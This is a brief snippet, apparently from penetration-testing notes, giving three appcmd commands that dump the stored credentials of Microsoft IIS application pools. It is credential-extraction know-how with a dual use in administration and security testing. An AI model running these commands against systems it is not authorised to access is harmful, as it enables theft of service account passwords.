### To extract passwords from app pools in Microsoft IIS Web Server

```
cd %systemroot%\system32\inetsrv
appcmd.exe list apppool
appcmd list apppool "NameofAppPool" /text:*
```
